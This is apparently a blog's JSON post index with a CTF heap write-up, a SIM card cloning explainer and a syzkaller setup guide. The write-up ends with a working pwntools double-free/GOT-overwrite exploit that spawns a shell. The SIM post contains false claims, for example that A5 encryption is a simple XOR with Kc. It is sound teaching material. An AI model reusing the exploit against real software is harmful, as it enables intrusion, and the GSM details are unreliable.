[{"title":"Hello World","url":"/2021/02/16/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"},{"title":"ctf堆入门 - paper","url":"/2020/02/23/paper/","content":"\n[题目文件链接](https://xuanxuanblingbling.github.io/assets/pwn/paper)\n\n# 1、寻找漏洞点\n\n拿到ELF后，先看看它的一些信息。\n- File查看文件格式\n- Checksec查看开启的安全编译选项\n- 运行一下看看都有哪些功能\n- 使用IDA看看伪代码，理解整个二进制程序的功并查找漏洞点。\n\n![](paper-1.png)\n\n64位程序，动态链接，没有去符号表，got表可写可读，开启栈不可执行和canary保护，没有做地址随机化。\n\n![](paper-2.png)\n\n程序提供两个功能，增加paper和删除paper，paper中可以存放指定大小的数据。\n\n![](paper-3.png)\n\nIDA查看程序实现，关注add_paper和delete_paper。\n\n![](paper-4.png)\n\nAdd paper中申请一块堆，然后存放数据。这个函数实现各项检查都做得很好，没发现漏洞点。\n\n![](paper-5.png)\n\nDelete paper中free掉指向堆的`link_list[index]`指针后，没有将该指针置NULL。导致一个悬空指针的产生《对几类危险的指针，见本文的记录——三类漏洞指针》。\n\n# 2、利用分析\n\n堆管理机制中，对于较小的堆块，采用fastbin的方式进行回收（本题中要求堆块小于0x80，这样free操作之后，该chunk会被链接到fastbin上）。本题中，申请的最大堆内存为1024Byte，所以要控制申请的堆大小不超过0x80。\n\n根据fastbin的单向链表及其他特性《见记录——fastbin attack》，我们需要通过double free在fastbin的链表中构造一个环（如下图）。然后申请一个与chunk1、chunk2相同大小的堆，此时会返回chunk1给线程使用，于是可以更改chunk1中的数据（如将“fd”位置处的值改为我们的目标地址）。下一次malloc时分配chunk2，再下一次分配时依然是chunk1，但此时main_arena已经指向目标地址处（如果目标地址合理）了。此时再malloc一次，就可以实现对该地址空间写任意值了。\n\n![](paper-6.png)\n\n这样接下来的目标就是，往哪里写才能getshell呢？\n\n要getshell就必须控制指针的执行流，使其执行我们构造的提权函数或者直接去执行该二进制文件中已有的提权函数。\n\n（1）寻找或构造提权函数（这里以ELF中自带提权函数为例）\n\n回到ELF文件，搜索“/bin/sh”或system函数，看是否存在这种后门，使利用更加简单。在string窗口中搜索“/bin/sh”，查看其引用gg，发现gg中会调用system(“/bin/sh”)。\n\n![](paper-7.png)\n\n![](paper-8.png)\n\n![](paper-9.png)\n\n至此，我们的提权函数就找到了！那么怎样才能让程序流乖乖地来执行我们的提权函数呢？\n\n（2）替换函数内容或替换函数指针（这里以替换函数指针为例）\n\t\n控制执行流的做法通常是将原本要执行的函数进行替换，替换函数指针或者替换掉函数内容。\n\n这里我们已经有了一个提权函数gg，且ELF并未开启地址随机化，那么首先想到的是控制某个函数指针指向gg。也就是说要把gg函数的地址0x00400943写到某个会被当做“函数指针”的地址0x12345678上去，这样当原本程序流从该0x12345678上取值并跳转执行时，就会执行gg函数了。\n\n![](paper-10.png)\n\n往哪里写这个gg函数地址呢？回到ELF文件，逆向查看伪源码，源码中并未定义有用的函数指针，但是栈上的返回地址可以作为考虑的一个选项。另外一种方法，就是去覆写got表了，具体做法是更改该got表的某个表项内地址为gg函数地址。这样当程序执行到该got表中函数（如printf、puts、gets等等）时，便会去执行我们的提权函数啦。\n\n那么最后，怎么获取到got表的地址以及该got条目的地址呢？由于本题的ELF未开启地址随机化，所以可直接通过IDA查看got表的起始地址以及各表项的具体地址。然而，对于开启随机化的ELF，就需要我们想办法去泄露got表地址了，这个方法在这篇文章中不予讨论。\n\n可以看到该ELF的got表条目如下，got表地址为0x00602000。\n\n![](paper-11.png)\n\n到这里利用思路基本明确了，就是将chunk1中fd的地址替换成got表中某一项（会执行到的函数）的值，然后将该项的值改成gg函数地址。\n\n那么这个got表中的地址需不需要满足什么条件呢？答案是必须的！main_arena把chunk从fastbin链表上卸下来的时候，会去检查该chunk中fd指向的另一chunk是否为合法chunk。合法chunk的特征是什么呢？就是目标chunk数据区之前的八个字节（64位下）必须是合法的size值，标志这个chunk的大小。Ps：其实只要这八个字节的低四字节满足就可以了。\n\n因此我们需要在上述got表中，寻找满足这种条件的地址。如下图，标记颜色的五个部分满足低四个字节为0x00000040或0x00000060，这可以是一个合法的size值。\n\n![](paper-12.png)\n\n但是选哪个作为目标地址呢，还需要结合got表项进行考虑。\n\n- 选0x602002处作为chunk的size部分\n- 选0x60201a处作为chunk的size部分\n- 选0x602032处作为chunk的size部分\n- 选0x60203a处作为chunk的size部分\n\n如果我们想覆写printf函数，即0x602040处的值，那么得使用0x602032处作为chunk的size部分。此时整个chunk的起始地址是0x60202a。可任意写的数据区从0x60203a开始。由于system函数在0x602038至0x60203f区间，因此0x60203a至0x60203f的值需要保持不变。需要将0x602040至0x602047的值改为gg函数地址。因此需要往0x60202a写入的内容为：\\x40\\x00\\x00\\x00\\x00\\x00+gg地址\n\n因为最终选择的chunk size（包含chunk头）为0x40，所以申请的堆内存大小必须是0x30。接下来可以写利用代码了。\n\n# 3、EXP\n\n```python\nfrom pwn import *\ncontext(os=\"linux\",arch=\"amd64\",log_level=\"debug\")\n\ne = ELF(\"./paper\")\nio = process(e.path)\n\ndef add_paper(index,length,content):\n    io.recv()\n    io.sendline(\"1\")\n    io.recv()\n    io.sendline(str(index))\n    io.recv()\n    io.sendline(str(length))\n    io.recv()\n    io.sendline(content)\n\ndef delete_paper(index):\n    io.recv()\n    io.sendline(\"2\")\n    io.recv()\n    io.sendline(str(index))\n    \nadd_paper(1,0x30,\"111\")\nadd_paper(2,0x30,\"222\")\n\ndelete_paper(1)\ndelete_paper(2)\ndelete_paper(1)\n\nadd_paper(3,0x30,p64(0x0060202a))\nadd_paper(4,0x30,\"444\")\nadd_paper(5,0x30,\"555\")\nadd_paper(6,0x30,\"\\x40\\x00\\x00\\x00\\x00\\x00\"+p64(e.symbols[\"gg\"]))\n\nio.recv()\nio.sendline(\"t\")\nio.interactive()\n\n```\n\n执行成功，getshell！\n\n![](paper-13.png)\n\n# 4、记录\n\n## 三类漏洞指针\n\n1、空指针：指向NULL的指针，若使用指针前未判断其是否为空，可导致程序崩溃。\n\n2、悬空指针：也称迷途指针，指向一段已释放的内存单元的指针，可导致UAF等漏洞。\n\n3、野指针：指向一段未初始化内存单元的指针。\n\n## fastbin attack\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/\n\n\n## GOT表与PLT\n\nhttps://blog.csdn.net/qq_18661257/article/details/54694748\n\nhttps://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html\n\n## pwntools的使用\n\nhttps://www.cnblogs.com/Ox9A82/p/5728149.html\n\n\n\n# 5 新机搭建pwn环境\n\n由于这题必须在ubunut1804环境下利用，所以整个pwn的做题环境又需要重新搭一遍。为了以后再遇到这种情况时，可以迅速完成环境搭建，这里做一下记录。\n\n## 安装pwntools\n\n```shell\napt-get update\napt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\npython3 -m pip install --upgrade pip\npython3 -m pip install --upgrade pwntools\n```\n\n## 安装checksec\n\n```shell\ngit clone https://github.com/slimm609/checksec.sh.git\ncd checksec.sh\nsudo cp checksec /usr/bin/checksec\n```\n\n新版使用方法：\n\n```shell\nchecksec --file=filename\n```\n\n## 安装pwndbg\n\n```shell\ngit clone https://github.com/pwndbg/pwndbg\ncd pwndbg\nsudo ./setup.sh\n```\n\n## 安装gef\n\nubuntu中下载gef.py不成功，因此跑去github直接下载源文件：\n\n[gef网址](https://github.com/hugsy/gef)\n\n```shell\n# 下载gef.py至/home/xxx用户根目录\n$ mv gef.py .gdbinit-gef.py\n$ echo \"source ~/.gdbinit-gef.py\" >> ~/.gdbinit\n```\n\n## 安装peda\n\n[peda网址](https://github.com/longld/peda)\n\n```shell\n$ git clone https://github.com/longld/peda.git ~/peda\n$ echo \"source ~/peda/peda.py\" >> ~/.gdbinit\n```\n\n## 安装ROPGadget\n\n```shell\nsudo pip install capstone\ngit clone https://github.com/JonathanSalwan/ROPgadget.git\ncd ROPgadget\nsudo python3 setup.py install\n```\n\n## 安装one_gadget\n\n```shell\n$ sudo apt -y install ruby\n$ sudo gem install one_gadget \n```\n\n## 安装LibcSearcher\n\n```shell\ngit clone https://github.com/lieanu/LibcSearcher.git\ncd LibcSearcher\nsudo python3 setup.py develop\n```\n\n## 安装32位libc\n\n方便运行32位程序，有两种方法：\n\n（1）\n\n```shell\nsudo dpkg --add-architecture i386\nsudo apt-get update\nsudo apt-get install libc6:i386\nsudo apt-get install libgtk2.0-0:i386\n```\n\n（2）\n\n```shell\n# 第一步，确认系统的架构\ndpkg --print-architecture  \n# 第二步，确认打开了多架构支持功能\npkg --print-foreign-architectures \n# 第三步，安装对应的32位库\nsudo apt-get dist-upgrade #这一步是更新所有的软件，如果你对新版本软件的需求不是那么迫切，可以不执行 \n#安装相关库  \nsudo apt-get install lib32z1 lib32ncurses5 #有的还需要32位stdc++库lib32stdc++6-4.8-dbg\n#安装gcc multilab  \nsudo apt-get install gcc-multilib g++-multilib  \n```\n\n","tags":["heap","fastbin"],"categories":["CTF"]},{"title":"SIM卡复制原理","url":"/2020/02/08/SIM/","content":"# SIM卡复制原理\n\n> GSM手机要想得到GSM系统的服务需要插入一张SIM卡。因为GSM系统是通过SIM卡来识别用户的，而不是基于手机来识别。\n>\n> 移动终端上必须装上sim卡才能使用，sim卡是整个**GSM系统**（全球移动通讯系统）中唯一确认用户身份的设备。\n\n## 常用缩写\n\nSIM，Subscriber Identification Module，客户识别模块（也称用户身份识别卡）。\n\nIMEI，国际移动设备识别码。由15位数字组成，每台手机对应一个IMEI，为全世界独一无二的。\n\nMEID，移动设备识别码。由14位十六进制字符组成。\n\nIMSI，国际移动用户识别码。通过IMSI可反查运营商、归属地、手机号码等信息。\n\n## sim卡的演进\n\n1991年，德国捷德公司开发了世界第一张SIM卡，大小是一个名片的大小。此类卡是**标准SIM卡**，也叫“原卡”。\n\n中国移动通信起步较晚，没赶上“原卡”时代，因此我们一开始接触到的是Mini SIM卡。再之后由于手机逐步小型化，2010年出现了Micro SIM卡，首先使用在苹果公司的产品上，如ipad、iphone4。2011年，苹果公司提出了更小的sim卡标准——Nano SIM卡。\n\n![](sim-4-kinds.png)\n\n以上的演进，说白了就是剪卡过程，并不是什么技术演进。\n\n但是Nano SIM卡还是占据较大的空间，在小型可穿戴设备上不实用，而且卡槽中放卡的方式不稳定。因此发展出了eSIM卡Embeded-SIM，直接嵌入到电路板上。\n\n但是eSIM仍然是一个硬件。现在还出现了依靠操作系统软件实现SIM卡功能的softSIM和vSIM，这样就完全告别实体SIM卡片了。\n\n伴随着网络变化，sim卡的变化：\n\n- SIM卡存在无法接入LTE/IMS网络的局限性\n- USIM可接入LTE/2G/3G网络，但不存储IMS网络相关的用户信息，因此接入VoLTE网络时，还需要通过终端导出IMS注册时所需要的用户码号信息。\n- ISIM卡是在USIM卡的基础上，增加了ISIM模块，专门用于存储IMS网络相关用户码号和归属地信息。可以通过读取ISIM模块中的信息直接接入VoLTE网络。\n\n## sim卡硬件特性\n\n> sim卡是一个装有微处理器的芯片卡。\n\n下面看一看实际的sim卡长什么样：\n\n![](sim-6-parts.png)\n\nsim卡通过这些铜制接口将卡内逻辑电路与移动终端连接起来。其中与移动终端连接的有如下六个触电：电源（Vcc），复位（RESET），时钟（CLK），接地端（GND），编程电压（VPP），数据I/O接口（Data）\n\nsim卡硬件内部包含如下五个模块：\n\n- 微处理器cpu，8位\n- 程序存储器ROM，3~8kbit\n- 工作存储器RAM，6~16kbit\n- 数据存储器EPROM，128~256kbit\n- 串行通信单元\n\n使用时，手机会向sim卡发送命令，sim卡根据标准规范执行后，给手机反馈执行结果。\n\n##　sim卡的功能\n\n1、存储数据：\n\n- 固定数据：这类数据在ME（Mobile Equipment）被出售之前由SIM卡中心写入，包括国际移动用户识别号（IMSI）、鉴权密钥（KI）等\n- 临时数据：指的是网络相关的的临时数据，如位置区域识别码（LAI）、移动用户暂时识别码（TMSI）、禁止接入的公共电话网代码等\n- 业务代码：如个人识别码（PIN）、解锁码（PUK）、计费费率等\n- 电话号码、短消息等用户记录\n\n（以上四类数据，除第一类只有专业部门能查阅和更新外，其他几类都是手机可查阅和更新的）\n\n2、PIN码保护\n\n3、用户身份鉴权\n\n4、SIM卡中的保密算法及密钥\n\n## sim卡认证\n\nSIM卡中没有存储本机号码，仅有IMIS号。当我们在营业厅申请并注册手机号时，运营商将手机号码与SIM卡的IMSI号、序列号以及鉴权密钥Ki做登记，储存在数据库里。\n\nSIM卡插入到手机中开机时，手机向SIM卡请求IMSI，然后把IMSI发送给运营商。运营商在数据库中查找是否存在这个IMSI并判断是否为合法用户，然后获得这个IMSI对应的手机号码和鉴权密钥Ki。\n\n运营商再生成一个随机数RAND，然后将该随机数发送给手机。手机接收到随机数RAND后，将该随机数RAND发送给SIM卡。SIM卡利用RAND和鉴权密钥Ki通过A3算法生成应答SRES，将SRES发送给手机，再由手机转发给运营商。运营商在本地利用RAND和对应的鉴权密钥Ki进行相同的运算，得到X-SRES，并比较SRES和X-SRES是否相同，相同的话就说明这个卡是合法的，允许其接入网络。\n\n上一步骤中，手机端收到RAND时，同时还会让SIM卡利用RAND和Ki计算出一个通信用的加密密钥Kc，计算时用的算法称之为A8。由于A3和A8接受的输入相同，因此实现者偷了个懒，用一个算法同时生成SRES和Kc。\n\n之后的通信过程中，使用加密密钥Kc和A5算法对通信内容进行加密。由于通信内容的加密量巨大，SIM卡无法快速处理如此多的加密需求，因此通信过程中的加密都是在手机上完成的。因此，所有的GSM手机都必须至少支持一种相同的A5算法，否则就无法漫游了。这时候运营商和设备商又偷了个懒，全世界目前都只用一种A5算法。这个算法的做法就是和Kc的8字节序列进行简单的循环XOR，再和报文序号做个减法。\n\n## sim卡复制\n\n从以上SIM卡认证原理中，我们知道IMSI和Ki是必不可少的，A3算法也必须知道。IMSI可以通过手机将其从SIM卡中读取出来，但是A3算法和鉴权密钥Ki是无法直接获取的，只能通过某种方法破解。\n\nA3算法一直被作为高级商业机密保护起来。但在1998年左右，有个人泄露了几页关于A3算法的文档到网络上。加州伯克利的几个教授拿到这个文档后，对照着SIM卡研究了一阵，最终将A3算法破解了。这个算法又叫做Comp128。\n\n怎么获取Ki呢？两个思路，一种是把SIM卡拆掉然后接到特殊设备上将Ki读取出来，另一种是利用Comp128去暴力破解、穷举。前一种方法就像用小刀在硬盘上刻操作系统一样不靠谱。后一种方法有一定的限制，SIM卡中的逻辑是一共只能查询2^16次左右，之后卡就不可用了。因此，研究者们只能在可接受的次数之内，通过构造特定明文和分析输出的密文来破解Ki的值。这种方法最终成功了。\n\n由于SIM复制设备越来越多，运营商们不得不发行新算法的卡，这个算法叫做Comp128 v2。这个算法目前为止还没被破解。\n\n\n# reference\nSIM卡实现原理：https://www.jianshu.com/p/8c9374f5e581\n\n4G LTE 网只能提供数据服务，不能承载语音通话，该怎么理解？https://www.zhihu.com/question/22365275\n\nSIM卡复制原理：https://cn.club.vmall.com/thread-2454925-1-1.html\n\n关于SIM和eSIM，看这一篇就够啦！https://zhuanlan.zhihu.com/p/47999705\n\nSIM卡中的A3、A5和A8算法：http://www.360doc.com/content/11/0913/22/3129476_148024343.shtml\n\n什么是伪基站？https://www.zhihu.com/question/36723973","categories":["通信"]},{"title":"syzkaller","url":"/2019/10/26/syzkaller/","content":"\n# 1.总览\n\n关于[Syzkaller](https://github.com/google/syzkaller)是什么，我就不多说了，介绍的文档很多。直接进入正题吧~\n\ngithub上英文版的指导中，有些许坑需要自己踩踩，所以将搭建syzkaller的环境记录下来，供之后参考。本文计划搭建如下几个环境（会不断更新）：\n\n```\n1. 使用syzkaller去fuzz x86-64架构的linux内核，这个内核是用qemu模拟的。\n2. 使用syzkaller去fuzz arm64的手机设备，qemu模拟和实体机都准备尝试一下。\n3. 两台通过网络连接的linux机器之间的fuzz。\n```\n\n在正式开始之前，先说一下基本环境。我用来搭建环境的主机是Ubuntu18.04虚拟机，gcc版本是7.5.0。\n\n```\nsyzkaller官网对gcc版本的要求是>6.1.0。所以如果你的主机是Ubuntu16.04的话，可以按照安装gcc章节升级一下本地gcc版本。\n```\n\nubuntu 18.04搭建syzkaller环境，需要做以下四件事情：\n\n- 1、准备好C编译环境。\n\n- 2、准备好待测试的Linux kernel，并开启coverage代码覆盖率选项。\n\n\n- 3、准备测试机，虚拟机或者物理机。\n\n- 4、准备好syzkaller源码，并编译。（由于syzkaller是由go语言写的，所以这里需要提前安装好go语言环境）\n\n# 2.安装GCC\n\n> gcc下载地址：[gcc下载](http://ftp.gnu.org/gnu/gcc/)\n\n宿主机自带的gcc版本过低的话，需要在原本的基础上新装一个高版本的gcc。这里我选择源码安装，并且将它安装到一个单独目录，这样今后想卸载的话，直接删除该目录即可。\n\n- 解压gcc-7.4.0源码包：`tar -zxvf gcc-7.4.0.tar.gz`（或者`tar -Jxvf gcc-7.4.0.tar.xz`）\n- 下载安装依赖项：在解压完的源码包中，执行./contrib/download_prerequisites（需更改base_url为http://mirror.linux-ia64.org/gnu/gcc/infrastructure/，如果执行时一直没有进度，考虑加上sudo权限执行）。若执行不成功，则需自行下载安装，步骤如下。\n\n```\ngcc7.4.0依赖的gmp,mpfr和mpc版本如下：\n\tgmp='gmp-6.1.0.tar.bz2'\n\tmpfr='mpfr-3.1.4.tar.bz2'\n\tmpc='mpc-1.0.3.tar.gz'\n\n安装过程参考链接：\nhttps://blog.csdn.net/lwbeyond/article/details/77718040（主要参考该文档）\nhttps://blog.csdn.net/xs1102/article/details/89175293\nhttps://blog.csdn.net/davidhopper/article/details/79681695\n\n安装gmp到configure步骤时，出现“no usable m4”错误：\nhttps://blog.csdn.net/wangqing_12345/article/details/52484723\n```\n\n# 3 x86-64 linux kernel in qemu\n\n> 标题解释：这一小节的fuzz对象是linux kernel，架构是x86-64，是使用qemu模拟出来的。\n\n## 3.1 编译syzkaller\n\n### 3.1.1 搞定go环境\n\ngo官网：[https://golang.org/dl](https://golang.org/dl/)\n\n```shell\nwget https://dl.google.com/go/go1.14.2.linux-amd64.tar.gz\ntar -xf go1.14.2.linux-amd64.tar.gz\nmv go goroot\nmkdir gopath\nexport GOPATH=`pwd`/gopath\nexport GOROOT=`pwd`/goroot\nexport PATH=$GOPATH/bin:$PATH\nexport PATH=$GOROOT/bin:$PATH\n```\n\n- goroot/ 存放go源码\n\n- gopath/ 是go的工作目录\n\n需要将它们都添加到环境变量`~/bashrc`中去，然后再`source ~/.bashrc`更新一下环境变量。\n\n### 3.1.2 下载syzkaller源码\n\n```shell\ngo get -u -d github.com/google/syzkaller/prog\n```\n\n不要小瞧这一行代码，如果不把代理配置好，咱们在国内的同学可是要下哭。关于代理的配置，之后有空再更新文章吧。\n\n### 3.1.3 编译syzkaller\n\n```shell\ncd gopath/src/github.com/google/syzkaller/\nmake\n```\n\n这里需要注意，如果是在虚拟机中编译，要把虚拟机内存给多一点，比如8G。（我一开始只给了虚拟机4G内存，结果编译不通过）\n\n编译通过后，就可以在syzkaller的bin/下看到二进制文件啦。\n\n ![](syzkaller-mgr.png)\n\n## 3.2 编译linux kernel\n\nlinux kenrel github链接：[https://github.com/torvalds/linux](https://github.com/torvalds/linux)\n\n### 3.2.1 一切顺利的情况\n\n1. 下载linux源码\n\n```shell\ngit clone git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git\n```\n\n2. 生成配置文件\n\n```shell\ncd $kernel\nmake defconfig\nmake kvmconfig\n```\n\n3. 更改.config文件对内核的配置选项或者使用`make menuconfig`进行配置\n\n```shell\n# Coverage collection.\nCONFIG_KCOV=y\n\n# Debug info for symbolization.\nCONFIG_DEBUG_INFO=y\n\n# Memory bug detector\nCONFIG_KASAN=y\nCONFIG_KASAN_INLINE=y\n\n# Required for Debian Stretch\nCONFIG_CONFIGFS_FS=y\nCONFIG_SECURITYFS=y\n```\n\n4. 重新生成config文件\n\n```shell\nmake olddefconfig\n```\n\n5. 开始编译内核\n\n```shell\nmake -j4\n```\n\n编译完成后，可以在如下目录中看到vmlinux和bzImage文件\n\n```shell\n$ ls $KERNEL/vmlinux\n$KERNEL/vmlinux\n$ ls $KERNEL/arch/x86/boot/bzImage\n$KERNEL/arch/x86/boot/bzImage\n```\n\n### 3.2.2 若gcc版本过低\n\n最初有一次使用gcc 7.1.0编译最新版kernel时出错`“You are building kernel with non-retpoline compiler, please update your compiler..”`。查阅了一些资料显示，是由于retpoline只有gcc7.3.0及以上的版本才支持，因此需要在本地编译一个高版本gcc，并使用如下方式指定make时的编译器。以gcc8.0.1为例，编译过程如下：\n\n```shell\ncd $KERNEL\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" defconfig\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" kvmconfig\n```\n\n然后更改.config文件中的选项，使其支持我们需要的一些功能\n\n```shell\nCONFIG_KCOV=y\nCONFIG_DEBUG_INFO=y\nCONFIG_KASAN=y\nCONFIG_KASAN_INLINE=y\nCONFIG_CONFIGFS_FS=y\nCONFIG_SECURITYFS=y\n```\n\n保存完该文件后，编译\n\n```shell\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" oldconfig\nmake CC=\" /usr/local/gcc-8.0.1/bin/gcc\" -j4\n```\n\n编译完成后，可以看到vmlinux（kernel binary）和bzImage（packed kernel image）。\n\n![](syzkaller-vmlinux.png)\n\n## 3.3 配置qemu vm\n\n1. 安装qemu\n\n使用一条简单的命令即可：\n\n```shell\nsudo apt-get install qemu-system-x86\n```\n\n2. 生成image\n\n使用debootstrap构建linux启动镜像：\n\n```shell\nsudo apt-get install debootstrap\ncd $IMAGE/\nwget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh\nchmod +x create-image.sh\n./create-image.sh\n\n# 可以使用./create-image.sh -h查看更多帮助选项\n```\n\n完成之后目录内容如下：\n\n```shell\nbling@Ubuntu1804:~/s_image$ ll\ntotal 502072\ndrwxr-xr-x  3 bling bling       4096 1月   9 09:03 ./\ndrwxr-xr-x 25 bling bling       4096 1月   9 00:45 ../\ndrwxr-xr-x 21 root  root        4096 1月   9 02:25 chroot/\n-rwxr-xr-x  1 bling bling       6360 1月   9 00:13 create-image.sh*\n-rw-------  1 bling bling       1675 1月   9 09:03 stretch.id_rsa\n-rw-r--r--  1 bling bling        398 1月   9 09:03 stretch.id_rsa.pub\n-rw-r--r--  1 bling bling 2147483648 1月   9 09:04 stretch.img\n```\n\n3. 启动虚拟机\n\n启动虚拟机试试\n\n```shell\nqemu-system-x86_64 -m 2G -smp 2 -kernel /home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage -append \"console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0\" -drive file=/home/bling/s_image/stretch.img,format=raw -net user,hostfwd=tcp:127.0.0.1:10021-:22 -net nic,model=e1000 -enable-kvm -nographic -pidfile vm.pid 2>&1 | tee vm.log\n```\n\n对以上各参数我的理解如下：\n\n```\n-kernel xxx/bzImage：用bzImage作为内核镜像，qemu的这个功能用来测试不同内核非常方便。\n-append cmdline：将cmdline作为内核的命令行参数\n-hda xxx/xxx.img：指定xxx.img作为硬盘镜像\n-net user,hostfwd=tcp::10021-:22 -net nic：客户机与宿主机之间通过指定的端口进行通讯\n-enable-kvm：开启kvm虚拟化\n-nographic：非图形界面启动\n-m 2G：分配2G内存给虚拟系统\n-smp 2：指定虚拟机由2个CPU\n-pidfile xxx.pid：将qemu进程pid储存在xxx.pid这个文件中\n2>&1 | tee vm.log：将执行过程中的输出同时定向到标准输出和vm.log文件中\n```\n\n参考了两篇文章：（1）[hostfwd的问题](https://blog.csdn.net/tzwsoho/article/details/80303088) （2）[make 2>&1 | tee log.txt 命令解析](https://blog.csdn.net/Dr_Unknown/article/details/76837708)\n\nqemu启动起来之后，运行ssh测试一下是否连通，便于后期syzkaller运行出错时定位问题。\n\n```shell\nssh -i $IMAGE/stretch.id_rsa -p 10021 -o \"StrictHostKeyChecking no\" root@localhost\n```\n\n曾经有一次连接时在这里出了问题，宿主机上ssh无法连接到虚拟机。原因如下：\n\n由于上一步中create-image.sh中如下eth0跟实际qemu虚拟机中运行的网卡名称不一样，导致网卡没有分配IP地址。最后解决方法如下：qemu启动虚拟机，root用户身份登录后，设置网卡IP地址。\n\n![](syzkaller-ethnet.png)\n\n参考文章：（1）[网卡没分配IP地址的解决方法](https://blog.csdn.net/wuzhong8809/article/details/83374140)（2）[rsa公私钥知识点](https://xuanxuanblingbling.github.io/ctf/web/2019/05/10/rsa/)（3）[一个自己生成公私钥配置的方法](http://embedsec.systems/zh/gnulinux-security/2017/06/05/syzkaller.html)\n\n```shell\n# 关闭qemu虚拟机\nkill $(cat vm.pid)\n```\n\n## 3.4 启动syzkaller\n\n为了使syzkaller运行起来，在syzkaller目录下，新建一个workdir目录，并新建一个config文件用于配置运行所需参数（命名为xxx.cfg）\n\n```shell\nmkdir workdir\n./bin/syz-manager -config=abcd.cfg\n```\n\ncfg文件的格式如下，根据实际情况各参数可做更改：\n\n```\n{\n        \"target\": \"linux/amd64\",\n        \"http\": \"127.0.0.1:56741\",\n        \"workdir\": \"/home/bling/gopath/src/github.com/google/syzkaller/workdir\",\n        \"kernel_obj\": \"/home/bling/Downloads/linux-5.5.1\",\n        \"image\": \"/home/bling/s_image/stretch.img\",\n        \"sshkey\": \"/home/bling/s_image/stretch.id_rsa\",\n        \"syzkaller\": \"/home/bling/gopath/src/github.com/google/syzkaller/\",\n        \"procs\": 8,\n        \"type\": \"qemu\",\n        \"vm\": {\n                \"count\": 4,\n                \"kernel\": \"/home/bling/Downloads/linux-5.5.1/arch/x86/boot/bzImage\",\n                \"cpu\": 2,\n                \"mem\": 2048\n        }\n}\n```\n\n执行成功后，如下图所示：\n\n![](syzkaller-running.png)\n\n\n\n# 4 arm64 android kernel goldfish\n\n> 标题解释：这一小节的fuzz对象是linux kernel，架构是arm64，是使用goldfish模拟出来的。\n\n待补充...\n\n\n\n# 5 定制\n\n> 对于新的内核接口，增加系统调用描述\n\n## 5.1 syz-extract和syz-sysgen\n\nsyzkaller在编译的时候，默认不会编译syz-extract这个模块。因此我们需要手工编译一下。\n\n在syzkaller源码目录下，执行如下命令：\n\n```\nmake bin/syz-extract\n```\n\n如果syz-sysgen也没默认编译的话，执行如下命令：\n\n```\nmake bin/syz-sysgen\n```\n\n他俩的关系是这样的：\n\n```\n         +-------+            +---------+           +------+\n         |xxx.txt+----------->|xxx.const+---------->|xxx.go|\n         +---+---+            +---------+           +------+\n             |    syz-extract            syz-sysgen    ^\n             |                                         |\n             +-----------------------------------------+\n```\n\n我们针对某个驱动接口写出xxx.txt，然后使用syz-extract利用txt和源码生成const文档，最后执行syz-sysgen时syzkaller会根据txt和const生成一个go文件。可在sys/linux/gen/amd64.go和executor/syscalls.h中看到结果。\n\n## 5.2 一次定制示例\n\n- 编写一个有漏洞的驱动接口，并将其编译进内核（或者使用打ko的方式）。\n- 编写驱动接口对应的txt文件，将其放入syzkaller/sys/linux目录下，生成go文件并重新编译syzkaller。\n- 运行syzkaller，改config文件指定fuzz接口提高速率，最后分析crash。\n\n### 5.2.1 构造一个内核模块的漏洞\n\n1. 在`kernel_src/drivers/char`目录下，新建一个testxy.c。内容如下，这是一个有漏洞的内核模块。\n\n```c\n#include <linux/init.h>\n#include <linux/module.h>\n#include <linux/proc_fs.h>\n#include <linux/uaccess.h>\n#include <linux/slab.h>\n\n#define MY_DEV_NAME \"test\"\n#define DEBUG_FLAG \"PROC_DEV\"\n\nstatic ssize_t proc_read (struct file *proc_file, char __user *proc_user, size_t n, loff_t *loff);\nstatic ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff);\nstatic int proc_open (struct inode *proc_inode, struct file *proc_file);\nstatic struct file_operations a = {\n                                .open = proc_open,\n                                .read = proc_read,\n                                .write = proc_write,\n};\n\n\nstatic int __init mod_init(void)\n{\n    struct proc_dir_entry *test_entry;\n    const struct file_operations *proc_fops = &a;\n    printk(DEBUG_FLAG\":proc init start!\\n\");\n\n    test_entry = proc_create(MY_DEV_NAME, S_IRUGO|S_IWUGO, NULL, proc_fops);\n    if(!test_entry)\n       printk(DEBUG_FLAG\":there is somethings wrong!\\n\");\n\n    printk(DEBUG_FLAG\":proc init over!\\n\");\n    return 0;\n}\n```\n\n2. 打开char/目录下的Kconfig文件，添加：\n\n```shell\nconfig TESTXY_MODULE\n        tristate \"heap overflow test\"\n        default y\n        help\n          This file is to test a buffer overflow.\n```\n\n3. 打开char/目录下的Makefile文件，添加：\n\n```shell\nobj-$(CONFIG_TESTXY_MODULE) += testxy.o\n```\n\n若/linux/drivers/char/是新目录，还需修改/linux/drivers/Kconfig（加上source \"drivers/char/Kconfig\"）；修改/linux/drivers/Makefile（加上obj-$(CONFIG_TEST_MODULE) += char/）。\n\n4. make menuconfig时可以在`Device Drivers -> Character devices -> Heap Overflow Test` (*表示直接编如内核，M表示模块形式) 处看到刚刚添加的测试模块。\n\n```shell\nmake clean\nmake menuconfig\nmake -j8\n```\n\n5. 